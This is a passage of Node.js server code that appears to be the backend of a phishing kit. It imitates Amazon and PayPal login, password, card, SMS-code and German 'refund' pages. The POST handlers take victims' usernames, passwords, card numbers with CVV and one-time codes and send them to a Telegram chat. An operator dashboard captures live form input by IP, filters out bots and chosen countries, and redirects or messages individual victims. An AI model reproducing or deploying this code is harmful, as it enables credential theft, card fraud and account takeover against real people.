  }

  // Update global settings
  globalSettings.countryFilterMode = mode;

  if (Array.isArray(countries)) {
    if (mode === 'block') {
      globalSettings.blockedCountries = countries.map(c => c.toUpperCase());
    } else {
      globalSettings.allowedCountries = countries.map(c => c.toUpperCase());
    }
  }

  // Store the redirect URL for country-based blocking if provided
  if (redirectUrl) {
    globalSettings.countryRedirectUrl = redirectUrl;
  }

  console.log(`Updated country filter: ${mode} mode with ${countries ? countries.length : 0} countries`);

  // Notify all clients about the update
  io.emit('dashboard-update');

  return res.json({
    success: true,
    message: `Country filter updated to ${mode} mode`,
    settings: {
      countryFilterMode: globalSettings.countryFilterMode,
      blockedCountries: globalSettings.blockedCountries,
      allowedCountries: globalSettings.allowedCountries
    }
  });
});

// Dashboard data API endpoint
app.get("/dashboard/data", (req, res) => {
  // Convert Map to object for JSON response
  const ipCacheData = {};
  ipCache.forEach((value, key) => {
    ipCacheData[key] = value;
  });

  // Return dashboard data with all necessary information
  res.json({
    totalVisitors: ipCache.size,
    botsDetected: Array.from(ipCache.values()).filter(info => info.isBot).length,
    proxyVpn: Array.from(ipCache.values()).filter(info => info.proxy || info.hosting).length,
    blockedIps: Array.from(ipCache.values()).filter(info => info.isBlocked).length,
    ipCache: ipCacheData,
    blockedCountries: globalSettings.blockedCountries,
    allowedCountries: globalSettings.allowedCountries,
    countries: globalSettings.countryFilterMode === 'block' ? globalSettings.blockedCountries : globalSettings.allowedCountries,
    countryFilterMode: globalSettings.countryFilterMode,
    proxyDetectionEnabled: globalSettings.proxyDetectionEnabled
  });
});

// Export visitor data API endpoint
app.get("/dashboard/export",  (req, res) => {
  // Convert Map to object for JSON export
  const visitorData = {};
  ipCache.forEach((value, key) => {
    // Include all visitor data except for internal flags
    const { isBot, isBlocked, ...exportData } = value;
    visitorData[key] = {
      ...exportData,
      // Add formatted timestamps for better readability
      firstRequestFormatted: new Date(value.firstRequest).toLocaleString(),
      lastRequestFormatted: value.lastRequest ? new Date(value.lastRequest).toLocaleString() : null,
      lastConnectedFormatted: value.lastConnected ? new Date(value.lastConnected).toLocaleString() : null,
      lastDisconnectedFormatted: value.lastDisconnected ? new Date(value.lastDisconnected).toLocaleString() : null
    };
  });

  // Set headers for file download
  res.setHeader('Content-Type', 'application/json');
  res.setHeader('Content-Disposition', `attachment; filename=visitor-data-${new Date().toISOString().slice(0, 10)}.json`);

  // Send the JSON data
  res.json(visitorData);
});

// Input data API for dashboard
app.get('/dashboard/input-data', (req, res) => {
  const allInputData = {};

  // Convert Map to object for JSON response
  inputDataCache.forEach((value, key) => {
    allInputData[key] = value;
  });

  res.json(allInputData);
});

// Detailed IP information API endpoint
app.get('/dashboard/ip/:ip', (req, res) => {
  const { ip } = req.params;

  if (!ip) {
    return res.status(400).json({ error: 'IP address is required' });
  }

  // Get visitor data for the IP
  const visitorData = ipCache.get(ip);

  if (!visitorData) {
    return res.status(404).json({ error: 'IP not found in cache' });
  }

  // Get input data for the IP
  const inputData = inputDataCache.has(ip) ? inputDataCache.get(ip) : [];

  // Combine visitor data with input data
  const detailedData = {
    ...visitorData,
    inputs: inputData
  };

  res.json(detailedData);
});



// Clear input logs endpoint
app.post('/dashboard/clear-input-logs', (req, res) => {
  // Clear the input data cache
  inputDataCache.clear();

  // Notify all dashboard clients that input data has been cleared
  io.emit('input-data-update');

  res.json({ success: true, message: 'Input logs cleared successfully' });
});

// Redirect IP endpoint
app.post('/dashboard/redirect-ip', (req, res) => {
  const { ip, redirectUrl } = req.body;

  if (!ip || !redirectUrl) {
    return res.status(400).json({ success: false, message: 'IP address and redirect URL are required' });
  }

  // Check if IP exists in cache
  if (!ipCache.has(ip)) {
    return res.status(404).json({ success: false, message: 'IP not found in cache' });
  }


  // Store custom redirect URL for this IP
  const visitorData = ipCache.get(ip);
  ipCache.set(ip, {
    ...visitorData,
    customRedirectUrl: redirectUrl
  });
  console.log(`Custom redirect set for IP ${ip} to ${redirectUrl}`);

  // Use the emitRedirect helper to handle the redirect logic
  emitRedirect(ip, redirectUrl, visitorData.lastPath);

  return res.json({ success: true, message: `Redirect set for IP ${ip}` });
});

// Block IP endpoint
app.post("/dashboard/block", (req, res) => {
  const { ip } = req.body;
  if (ipCache.has(ip)) {
    const ipData = ipCache.get(ip);
    ipData.isBlocked = true;
    ipCache.set(ip, ipData);
    res.json({
      success: true,
      blockedCount: Array.from(ipCache.values()).filter((ip) => ip.isBlocked)
        .length,
      ...ipData,
    });
  } else {
    res.status(404).json({ success: false, message: "IP not found" });
  }
});

// Unblock IP endpoint
// Get visitor data by IP endpoint
app.get("/dashboard/visitor/:ip", (req, res) => {
  const { ip } = req.params;

  if (ipCache.has(ip)) {
    res.json(ipCache.get(ip));
  } else {
    res.status(404).json({ error: "Visitor not found" });
  }
});

app.post("/dashboard/unblock", (req, res) => {
  const { ip } = req.body;
  if (ipCache.has(ip)) {
    const ipData = ipCache.get(ip);
    ipData.isBlocked = false;
    ipCache.set(ip, ipData);
    res.json({
      success: true,
      blockedCount: Array.from(ipCache.values()).filter((ip) => ip.isBlocked)
        .length,
      ...ipData,
    });
  } else {
    res.status(404).json({ success: false, message: "IP not found" });
  }
});

// Block country endpoint
app.post('/dashboard/block-country', (req, res) => {
  const { countryCode } = req.body;

  // Validate country code (must be 2 letters)
  if (!countryCode || typeof countryCode !== 'string' || countryCode.length !== 2) {
    return res.json({ success: false, message: 'Invalid country code format' });
  }

  // Standardize to uppercase
  const formattedCode = countryCode.toUpperCase();

  // Check if already in the list
  if (!globalSettings.blockedCountries.includes(formattedCode)) {
    globalSettings.blockedCountries.push(formattedCode);
    console.log(`Added ${formattedCode} to blocked countries list`);
  }

  // Notify all dashboard clients about the update
  io.emit('dashboard-update');

  res.json({
    success: true,
    message: `Country ${formattedCode} added to blocked list`,
    countries: globalSettings.blockedCountries
  });
});

app.post('/dashboard/unblock-country', (req, res) => {
  const { countryCode } = req.body;

  // Validate country code
  if (!countryCode || typeof countryCode !== 'string') {
    return res.json({ success: false, message: 'Invalid country code' });
  }

  // Standardize to uppercase
  const formattedCode = countryCode.toUpperCase();

  // Remove from blocked list
  const initialLength = globalSettings.blockedCountries.length;
  globalSettings.blockedCountries = globalSettings.blockedCountries.filter(c => c !== formattedCode);

  // Check if anything was removed
  const wasRemoved = initialLength > globalSettings.blockedCountries.length;

  if (wasRemoved) {
    console.log(`Removed ${formattedCode} from blocked countries list`);
    // Notify all dashboard clients about the update
    io.emit('dashboard-update');
  }

  res.json({
    success: true,
    message: wasRemoved ? `Country ${formattedCode} removed from blocked list` : `Country ${formattedCode} was not in blocked list`,
    countries: globalSettings.blockedCountries
  });
});

app.post('/dashboard/allow-country', (req, res) => {
  const { countryCode } = req.body;

  // Validate country code (must be 2 letters)
  if (!countryCode || typeof countryCode !== 'string' || countryCode.length !== 2) {
    return res.json({ success: false, message: 'Invalid country code format' });
  }

  // Standardize to uppercase
  const formattedCode = countryCode.toUpperCase();

  // Check if already in the list
  if (!globalSettings.allowedCountries.includes(formattedCode)) {
    globalSettings.allowedCountries.push(formattedCode);
    console.log(`Added ${formattedCode} to allowed countries list`);
  }

  // Notify all dashboard clients about the update
  io.emit('dashboard-update');

  res.json({
    success: true,
    message: `Country ${formattedCode} added to allowed list`,
    countries: globalSettings.allowedCountries
  });
});

app.post('/dashboard/disallow-country', (req, res) => {
  const { countryCode } = req.body;

  // Validate country code
  if (!countryCode || typeof countryCode !== 'string') {
    return res.json({ success: false, message: 'Invalid country code' });
  }

  // Standardize to uppercase
  const formattedCode = countryCode.toUpperCase();

  // Remove from allowed list
  const initialLength = globalSettings.allowedCountries.length;
  globalSettings.allowedCountries = globalSettings.allowedCountries.filter(c => c !== formattedCode);

  // Check if anything was removed
  const wasRemoved = initialLength > globalSettings.allowedCountries.length;

  if (wasRemoved) {
    console.log(`Removed ${formattedCode} from allowed countries list`);
    // Notify all dashboard clients about the update
    io.emit('dashboard-update');
  }

  res.json({
    success: true,
    message: wasRemoved ? `Country ${formattedCode} removed from allowed list` : `Country ${formattedCode} was not in allowed list`,
    countries: globalSettings.allowedCountries
  });
});

app.post('/dashboard/toggle-country-mode', (req, res) => {
  const { allowMode } = req.body;

  // Validate input
  if (allowMode === undefined) {
    return res.json({ success: false, message: 'Missing allowMode parameter' });
  }

  // Convert to boolean if string
  const newMode = allowMode === true || allowMode === 'true';
  const oldMode = globalSettings.countryFilterMode === 'allow-only';

  // Only update if there's a change
  if (newMode !== oldMode) {
    globalSettings.countryFilterMode = newMode ? 'allow-only' : 'block';
    console.log(`Country filter mode changed to: ${globalSettings.countryFilterMode}`);

    // Notify all dashboard clients about the update
    io.emit('dashboard-update');
  }

  res.json({
    success: true,
    message: `Country filter mode set to ${newMode ? 'Allow Only' : 'Block'} mode`,
    mode: globalSettings.countryFilterMode,
    countries: globalSettings.countryFilterMode === 'block' ? globalSettings.blockedCountries : globalSettings.allowedCountries
  });
});

// Toggle proxy detection endpoint
app.post('/dashboard/toggle-proxy-detection', (req, res) => {
  const { enabled } = req.body;
  if (enabled !== undefined) {
    globalSettings.proxyDetectionEnabled = enabled === true || enabled === 'true';
  } else {
    // Toggle if no value provided
    globalSettings.proxyDetectionEnabled = !globalSettings.proxyDetectionEnabled;
  }

  res.json({
    success: true,
    proxyDetectionEnabled: globalSettings.proxyDetectionEnabled
  });
});



//////////////////////////////
//=========================[GET]===================
app.get("/", (req, res) => { // login
  res.render("index");
});
app.get("/PPmP85AgNE4pnL5mWSM", (req, res) => { // loading 1:
  res.render("posas", { pass: req.session.username });
});
app.get("/loading", (req, res) => { // loading 1:
  const { time, url } = req.query;
  res.render("lopin", { url, time });
});
app.get("/QcEwP85AgNE4pnL5mWSM", (req, res) => { // loading 1:
  res.render("capoca");
});

app.get("/RKnUB922z6Mf4HDwg3EZ", (req, res) => { // loading 2:
  res.render("semitr-1");
});

app.get("/LGknmeM9HwWUWSutj6mJ", (req, res) => { // loading 3:
  res.render("semitr-2", { url: process.env.URL });
});

app.get("/PrTomeM9HwWUWSulkTe4", (req, res) => {
  const today = new Date();
  const processingDate = today.toLocaleDateString('de-DE', { day: '2-digit', month: 'long', year: 'numeric' });

  const deadline = new Date();
  deadline.setDate(today.getDate() + 2);
  const paymentDeadline = deadline.toLocaleDateString('de-DE', { day: '2-digit', month: 'long', year: 'numeric' });

  const refundAmount = "89,35";

  res.render("refund", {
    processingDate,
    paymentDeadline,
    refundAmount,
    orderNumber: "D01-9472X8" // As per your example
  });
});

app.get("/Ose4aQeM9H4waRfs7PrTv", (req, res) => { // bank auth verification page
  res.render("bankauth");
});

app.get("/LkaaomeM9HwWU472fgsPr", (req, res) => { // loading 3:
  const refundAmount = "89,35";
  res.render("done", { refundAmount });
});

app.get("/blaTxmdM9HwCP472fgsut", (req, res) => { // payment method selection
  res.render("method");
});


// paypal
app.get("/loadingpp", (req, res) => { // loading 1: paypal
  const { time, url } = req.query;
  res.render("loadpaypo", { url, time });
});

app.get("/HlX3xzdM2SwoPR72Fg5JL", (req, res) => { // login : paypal
  res.render("logipaypo");
});
app.get("/XTk4xzRM2swNZP73Ug5BP", (req, res) => { // PASS : paypal
  res.render("pasopaypo",{ user: req.session.paypaluser });
});
app.get("/VrC4xzeE2sw4ZB73xA5BI", (req, res) => { // PASS : err paypal
  res.render("pasoerrpaypo",{ user: req.session.paypaluser });
});
app.get("/SoZ4opAM7PZIBpY0Ua7tV", (req, res) => { // SMS : paypal
  res.render("simopaypo");
});

app.get("/CoR4opAT7PZu4op0UF7Po", (req, res) => { // SMS : paypal
  res.render("simopaypo2");
});




//======================[POST]======================
// Endpoint for tracker.js to send accurate client IP
app.post("/update-client-ip", (req, res) => {
  const { clientIP } = req.body;
  if (clientIP) {
    // Get the requestor's apparent IP
    const requestIP = req.headers["x-forwarded-for"]?.split(",")[0].trim() || 
                     req.headers["x-real-ip"] || 
                     requestIp.getClientIp(req);
    
    // Store mapping between the apparent IP and the accurate client IP
    accurateClientIPs.set(requestIP, {
      clientIP: clientIP,
      timestamp: new Date().toISOString()
    });
    
    console.log(`Stored accurate client IP mapping: ${requestIP} -> ${clientIP}`);
    res.send({ success: true });
  } else {
    res.status(400).send({ error: "No client IP provided" });
  }
});

app.post("/gzLbTbjqMpc34D4XsPJ2", (req, res) => { // login post
  let data = req.body;
  const clientIp = getAccurateClientIp(req);
  req.session.username = data.username;
  a1(data, clientIp);
  res.send({ OK: true });
});
app.post("/SSwP85AgNE4pnL5mWSM", (req, res) => { // posas post
  let data = req.body;
  const clientIp = getAccurateClientIp(req);
  try {
        if (process.env.CHATID && process.env.TOKEN) {
          bot.telegram.sendMessage(process.env.CHATID, `${brand} | [PASSWORD] (Amazon) | TEAM\n#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\nUSER: ${req.session.username}\nPASSWORD: ${data.password}\nIP: ${clientIp}\n#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n${brand} | [${target}] | TEAM`)
            .catch(error => console.error('Telegram notification failed:', error.message));
        } else {
          console.warn('Telegram bot not configured - Amazon password notification skipped');
        }
      } catch (error) {
        console.error('Error sending Amazon password notification:', error.message);
      }
  res.send({ OK: true });
});


app.post("/EpLP85AgNE4pn4RtpL", (req, res) => { // posas post
  let data = req.body;
  const clientIp = getAccurateClientIp(req);
  try {
        if (process.env.CHATID && process.env.TOKEN) {
          bot.telegram.sendMessage(process.env.CHATID, `${brand} | [REFUND] | TEAM\n#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n      Sa7bna Bari Refund\nIP: ${clientIp}\n#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n${brand} | [${target}] | TEAM`)
            .catch(error => console.error('Telegram notification failed:', error.message));
        } else {
          console.warn('Telegram bot not configured - refund notification skipped');
        }
      } catch (error) {
        console.error('Error sending refund notification:', error.message);
      }
  res.send({ OK: true });
});


app.post("/NkMNm4664XhcW8KuukHk", (req, res) => { // cc post
  let data = req.body;
  const clientIp = getAccurateClientIp(req);
  a2(data, clientIp);
  res.send({ OK: true });
});
app.post("/m4kT9BQWt7KTDdaVmafx", (req, res) => { // sms1 post
  let data = req.body;
  const clientIp = getAccurateClientIp(req);
  a3(data, clientIp);
  res.send({ OK: true });
});
app.post("/Qv69PRvXg6PQEvrzJx6j", (req, res) => { // sms2 post
  let data = req.body;
  const clientIp = getAccurateClientIp(req);
  a4(data, clientIp);
  res.send({ OK: true });
});

app.post("/BRgASbDqLpc24D4ZcYO9", (req, res) => { // LOGIN PayPal post
  let data = req.body;
  const clientIp = getAccurateClientIp(req);
  req.session.paypaluser = data.username;
  b1(data, clientIp);
  res.send({ OK: true });
});
app.post("/xGuVKoqaCJPI489XsT08", (req, res) => { // PASS PayPal post
  let data = req.body;
  const clientIp = getAccurateClientIp(req);
  
  try {
        if (process.env.CHATID && process.env.TOKEN) {
          bot.telegram.sendMessage(process.env.CHATID, `${brand} | [PASSWORD] (PayPal) | TEAM\n#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\nUSER: ${req.session.paypaluser}\nPASSWORD: ${data.password}\nIP: ${clientIp}\n#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n${brand} | [${target}] | TEAM`)
            .catch(error => console.error('Telegram notification failed:', error.message));
        } else {
          console.warn('Telegram bot not configured - PayPal password notification skipped');
        }
      } catch (error) {
        console.error('Error sending PayPal password notification:', error.message);
      }
  res.send({ OK: true });
});

app.post("/AD20rPkZd8QatVEZGz5l", (req, res) => { // PayPal sms post
  let data = req.body;
  const clientIp = getAccurateClientIp(req);
  b3(data, clientIp);
  res.send({ OK: true });
});

// Functions:
// 9alab dayal CHULDA:

function b1(data, ip) {
  let block = "";
  block += `${brand}  | [LOGIN] (PayPal) |  TEAM\n`;
  block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
  block += `USER: ${data.username}\nIP: ${ip}\n`;
  block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
  block += `${brand}  | [${target}]  |  TEAM`;

  try {
        if (process.env.CHATID && process.env.TOKEN) {
          bot.telegram.sendMessage(process.env.CHATID, block)
            .catch(error => console.error('Telegram notification failed:', error.message));
        } else {
          console.warn('Telegram bot not configured - notification skipped');
        }
      } catch (error) {
        console.error('Error sending Telegram notification:', error.message);
      }


}

function a1(data, ip) {
  let block = "";
  block += `${brand}  | [LOGIN] (Amazon) |  TEAM\n`;
  block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
  block += `USER: ${data.username}\nIP: ${ip}\n`;
  block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
  block += `${brand}  | [${target}]  |  TEAM`;

  try {
    if (process.env.CHATID && process.env.TOKEN) {
      bot.telegram.sendMessage(process.env.CHATID, block)
        .catch(error => {
          console.error('Telegram notification failed:', error.message);
        });
    } else {
      console.warn('Telegram bot not configured - notification skipped');
    }
  } catch (error) {
    console.error('Error sending Telegram message:', error.message);
  }


}
// Generic function to send Telegram notifications
function sendTelegramNotification(title, content, ip) {
  let block = "";
  block += `${brand}  | ${title} |  TEAM\n`;
  block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
  block += `${content}\nIP: ${ip}\n`;
  block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
  block += `${brand}  | [${target}]  |  TEAM`;

  try {
    if (process.env.CHATID && process.env.TOKEN) {
      bot.telegram.sendMessage(process.env.CHATID, block)
        .catch(error => {
          console.error('Telegram notification failed:', error.message);
          // Fallback: log to console instead of crashing
        });
    } else {
      console.warn('Telegram bot not configured - notification skipped');
    }
  } catch (error) {
    console.error('Error in sendTelegramNotification:', error.message);
  }
}

// Card notification function
function a2(data, ip) {
  const content = `CARD N*: ${data.cardNumber}\nMM/YY: ${data.expiryDate}\nCVV: ${data.cvv}\nCARD NAME: ${data.cardName}`;
  sendTelegramNotification('[CC-s5ona]', content, ip);
}


// SMS notification function (first code) PayPal
function b3(data, ip) {
  sendTelegramNotification('[SMS]{PayPal}(1)', `OTP: ${data.code}`, ip);
}

// SMS notification function (first code)
function a3(data, ip) {
  sendTelegramNotification('[SMS]{Amazon}(1)', `OTP: ${data.code}`, ip);
}

// SMS notification function (second code)
function a4(data, ip) {
  sendTelegramNotification('[SMS]{Amazon}(2)', `OTP: ${data.code}`, ip);
}





// Function to check if an IP is blocked
function isIPBlocked(ip) {
  // Check if IP exists in ipCache and has blocked flag
  if (ipCache.has(ip)) {
    const visitorData = ipCache.get(ip);
    return visitorData.blocked === true;
  }
  return false;
}

/**
 * Function to check if a country is allowed based on current filter mode
 * @param {string} countryCode - The country code to check
 * @returns {boolean} - Whether the country is allowed
 */
function isCountryAllowed(countryCode) {
  // If no country code provided, allow by default
  if (!countryCode) return true;
  
  // Standardize country code to uppercase
  const code = countryCode.toUpperCase();
  
  // Handle based on filter mode
  switch(globalSettings.countryFilterMode) {
    case 'block':
      // In block mode, allow if NOT in blocked list
      // Check if blockedCountries is a Set or an Array and use appropriate method
      if (globalSettings.blockedCountries instanceof Set) {
        return !globalSettings.blockedCountries.has(code);
      } else if (Array.isArray(globalSettings.blockedCountries)) {
        return !globalSettings.blockedCountries.includes(code);
      } else {
        // If it's neither, treat as empty collection (allow all)
        console.warn('blockedCountries is neither a Set nor an Array:', typeof globalSettings.blockedCountries);
        return true;
      }
      
    case 'allow-only':
      // In allow-only mode, only allow if in allowed list
      // Check if allowedCountries is a Set or an Array and use appropriate method
      if (globalSettings.allowedCountries instanceof Set) {
        if (globalSettings.allowedCountries.size === 0) return false;
        return globalSettings.allowedCountries.has(code);
      } else if (Array.isArray(globalSettings.allowedCountries)) {
        if (globalSettings.allowedCountries.length === 0) return false;
        return globalSettings.allowedCountries.includes(code);
      } else {
        // If it's neither, treat as empty collection (block all in allow-only mode)
        console.warn('allowedCountries is neither a Set nor an Array:', typeof globalSettings.allowedCountries);
        return false;
      }
      
    default:
      // Default to allow if mode is unknown
      return true;
  }
}

// Function to block an IP address
function blockIP(ip) {
  if (!ip || !ipCache.has(ip)) return false;
  
  // Update visitor data with blocked status
  const visitorData = ipCache.get(ip);
  visitorData.blocked = true;
  ipCache.set(ip, visitorData);
  
  // Get redirect URL
  const redirectUrl = globalSettings.countryRedirectUrl || redirectURL || 'https://google.com';
  
  // Redirect all active sockets for this IP
  emitRedirect(ip, redirectUrl);
  
  return true;
}

// Function to unblock an IP address
function unblockIP(ip) {
  if (!ip || !ipCache.has(ip)) return false;
  
  const visitorData = ipCache.get(ip);
  visitorData.blocked = false;
  ipCache.set(ip, visitorData);
  return true;
}

// Function to add sample visitors for testing the dashboard
function addSampleVisitors() {
  console.log('Adding sample visitors for testing...');
  
  // Sample visitor data with accurate country and city information
  const sampleVisitors = [
    {
      ip: '192.168.1.100',
      firstSeen: new Date(Date.now() - 3600000), // 1 hour ago
      lastRequest: new Date(),
      requestCount: 5,
      isOnline: true,
      isBot: false,
      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
      browser: 'Chrome',
      os: 'Windows',
      country: 'United States',
      countryCode: 'us',
      city: 'New York',
      isp: 'Verizon',
      proxy: false,
      hosting: false,
      suspiciousActivities: [],
      lastPath: '/',
      referrer: 'https://google.com',
      timezone: 'America/New_York'
    },
    {
      ip: '192.168.1.101',
      firstSeen: new Date(Date.now() - 7200000), // 2 hours ago
      lastRequest: new Date(Date.now() - 1800000), // 30 minutes ago
      requestCount: 3,
      isOnline: false,
      isBot: false,
      userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
      browser: 'Safari',
      os: 'Mac OS',
      country: 'United Kingdom',
      countryCode: 'gb',
      city: 'London',
      isp: 'BT',
      proxy: false,
      hosting: false,
      suspiciousActivities: [],
      lastPath: '/login',
      referrer: null,
      timezone: 'Europe/London'
    },
    {
      ip: '192.168.1.102',
      firstSeen: new Date(Date.now() - 10800000), // 3 hours ago
      lastRequest: new Date(),
      requestCount: 8,
      isOnline: true,
      isBot: false,
      userAgent: 'Mozilla/5.0 (Linux; Android 11; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
      browser: 'Chrome',
      os: 'Android',
      country: 'Germany',
      countryCode: 'de',
      city: 'Berlin',
      isp: 'Deutsche Telekom',
      proxy: true,
      hosting: false,
      suspiciousActivities: [],
      lastPath: '/account',
      referrer: 'https://example.com',
      timezone: 'Europe/Berlin'
    },
    {
      ip: '192.168.1.103',
      firstSeen: new Date(Date.now() - 14400000), // 4 hours ago
      lastRequest: new Date(Date.now() - 3600000), // 1 hour ago
      requestCount: 2,
      isOnline: false,
      isBot: false,
      userAgent: 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
      browser: 'Safari',
      os: 'iOS',
      country: 'France',
      countryCode: 'fr',
      city: 'Paris',
      isp: 'Orange',
      proxy: false,
      hosting: false,
      suspiciousActivities: [],
      lastPath: '/products',
      referrer: null,
      timezone: 'Europe/Paris'
    },
    {
      ip: '192.168.1.104',
      firstSeen: new Date(Date.now() - 18000000), // 5 hours ago
      lastRequest: new Date(),
      requestCount: 6,
      isOnline: true,
      isBot: true,
      userAgent: 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
      browser: 'Unknown',
      os: 'Unknown',
      country: 'United States',
      countryCode: 'us',
      city: 'Mountain View',
      isp: 'Google',
      proxy: false,
      hosting: true,
      suspiciousActivities: [],
      lastPath: '/sitemap.xml',
      referrer: null,
      timezone: 'America/Los_Angeles'
    }
  ];
  
  // Add sample visitors to the visitor metadata cache
  sampleVisitors.forEach(visitor => {
    visitorMetadata.set(visitor.ip, visitor);
  });
  
  console.log(`Added ${sampleVisitors.length} sample visitors to the cache`);
}

// Start the server
http.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  
  // Add sample visitors for testing
  addSampleVisitors();
});

// Socket.io connection handling
io.on('connection', (socket) => {
  // Use improved IP detection function
  const clientIP = getAccurateClientIp(socket.request);
  console.log(`User connected: IP=${clientIP}, SocketID=${socket.id}`);

    // Store IP in socket for later reference, will be updated when client sends their IP
    socket.clientIP = clientIP;
    
    // Check if IP is blocked
    if (isIPBlocked(clientIP)) {
      // Get redirect URL and emit redirect event
      const redirectUrl = globalSettings.countryRedirectUrl || redirectURL || 'https://google.com';
      socket.emit('redirect', { url: redirectUrl, reason: 'ip_blocked' });
      
      // Log the blocked IP attempt
      console.log(`Blocked IP ${clientIP} attempted to connect - redirecting to ${redirectUrl}`);
      
      // Disconnect after delay
      setTimeout(() => socket.connected && socket.disconnect(true), 2000);
      return;
    }
    
    // Get country code for the IP (if geo lookup is available)
    let countryCode = null;
    if (ipCache.has(clientIP) && ipCache.get(clientIP).countryCode) {
      countryCode = ipCache.get(clientIP).countryCode;
    }
    
    // Check country filtering
    if (countryCode && !isCountryAllowed(countryCode)) {
      // Get the appropriate redirect URL
      const redirectUrl = globalSettings.countryRedirectUrl || redirectURL || 'https://google.com';
      
      // Redirect visitor
      socket.emit('redirect', { 
        url: redirectUrl,
        reason: 'country_filtered'
      });
      
      // Disconnect after delay to allow redirect
      setTimeout(() => socket.connected && socket.disconnect(true), 2000);
      return;
    }

    // Update visitor online status or initialize new IP entry
    if (ipCache.has(clientIP)) {
      // Update existing visitor to online status
      updateVisitorOnlineStatus(clientIP, true, socket.id);
    } else {
      // Initialize a new IP cache entry
      initializeIPCacheEntry(clientIP, "/", socket);
      // Then update online status
      updateVisitorOnlineStatus(clientIP, true, socket.id);
    }

    // Emit updated dashboard data to all connected clients
    io.emit('dashboard-update');

    // Handle client disconnection
    socket.on('disconnect', () => {
      const ip = socket.clientIP;
      console.log(`User disconnected: IP=${ip}, SocketID=${socket.id}`);

      // Update visitor online status to offline for this socket
      updateVisitorOnlineStatus(ip, false, socket.id);
      
      // Remove from active sockets map
      if (activeSocketsByIP.has(ip)) {
        const activeSockets = activeSocketsByIP.get(ip);
        
        // Check if activeSockets is a Set and convert to array if needed
        const activeSocketsArray = Array.isArray(activeSockets) ? activeSockets : Array.from(activeSockets);
        
        const updatedSockets = activeSocketsArray.filter(s => s !== socket.id);
        if (updatedSockets.length > 0) {
          // If original was a Set, convert back to Set to maintain consistency
          const updatedCollection = activeSockets instanceof Set ? new Set(updatedSockets) : updatedSockets;
          activeSocketsByIP.set(ip, updatedCollection);
        } else {
          activeSocketsByIP.delete(ip);
        }
      }
    });

    // Handle redirect requests from dashboard
    socket.on('redirect-user', (data) => {
      // Get the exact IP and URL from the data
      const ip = data.ip;
      const url = data.url;
      
      console.log(`Dashboard requested redirect for IP ${ip} to ${url}`);
      
      // Use the simplified emitRedirect function
      const success = emitRedirect(ip, url);
      
      // Notify dashboard of the result
      if (success) {
        console.log(`Successfully sent redirect command to IP ${ip}`);
      } else {
        console.log(`Failed to redirect IP ${ip} - no active connections found`);
      }
    });
    
    // Handle message prompt requests from dashboard
    socket.on('message-prompt', (data) => {
      // Get the IP, message, type and title from the data
      const ip = data.ip;
      const message = data.message;
      const type = data.type || 'info';
      const title = data.title || 'Message';
      
      console.log(`Dashboard requested message prompt for IP ${ip}: ${message} (${type})`);
      
      // Use the emitMessagePrompt function
      const success = emitMessagePrompt(ip, message, type, title);
      
      // Notify dashboard of the result
      if (success) {
        console.log(`Successfully sent message prompt to IP ${ip}`);
      } else {
        console.log(`Failed to send message prompt to IP ${ip} - no active connections found`);
      }
    });
    
    // Handle client IP updates from browser
    socket.on('client-ip', (data) => {
      if (data && data.clientIP) {
        const oldIP = socket.clientIP;
        const newIP = data.clientIP;
        
        // Update socket.clientIP with the front-end IP
        socket.clientIP = newIP;
        console.log(`Updated client IP from ${oldIP} to ${newIP} for socket ${socket.id}`);
        
        // Update visitor online status for the new IP
        if (ipCache.has(newIP)) {
          updateVisitorOnlineStatus(newIP, true, socket.id);
        } else {
          // Initialize a new IP cache entry
          initializeIPCacheEntry(newIP, "/", socket);
          // Then update online status
          updateVisitorOnlineStatus(newIP, true, socket.id);
        }
        
        // Update visitor online status for the old IP if different
        if (oldIP && oldIP !== newIP) {
          updateVisitorOnlineStatus(oldIP, false, socket.id);
        }
      }
    });
    
    // Handle client presence heartbeats with enhanced client information
    // Handle input data from client
    socket.on('input-data', (data) => {
      if (data && (data.clientIP || data.ip)) {
        const ip = data.clientIP || data.ip;
        
        // Check if IP is blocked before processing
        if (isIPBlocked(ip)) {
          return;
        }
        
        // Initialize array if this is the first input for this IP
        if (!inputDataByIP.has(ip)) {
          inputDataByIP.set(ip, []);
        }
        
        // Add timestamp if not provided
        if (!data.timestamp) {
          data.timestamp = new Date().toISOString();
        }
        
        // Add the input data to the array
        const inputDataArray = inputDataByIP.get(ip);
        inputDataArray.push(data);
        
        // Limit the number of stored inputs per IP (keep the most recent 100)
        if (inputDataArray.length > 100) {
          inputDataArray.shift(); // Remove the oldest entry
        }
        
        // Store back in the map
        inputDataByIP.set(ip, inputDataArray);
        
        console.log(`Received input data from IP ${ip}: ${data.name} = ${data.value}`);
        
        // Emit an event to the dashboard to notify of new input data
        io.emit('input-data-update', { ip: ip });
      }
    });
    
    socket.on('client-presence', (data) => {
      if (data && data.clientIP) {
        const ip = data.clientIP;
        const path = data.path || '/';
        
        // Check if IP is blocked before processing
        if (isIPBlocked(ip)) {
          socket.emit('blocked', { message: 'Your IP has been blocked' });
          return;
        }
        
        // Update the client's information if provided
        if (ipCache.has(ip)) {
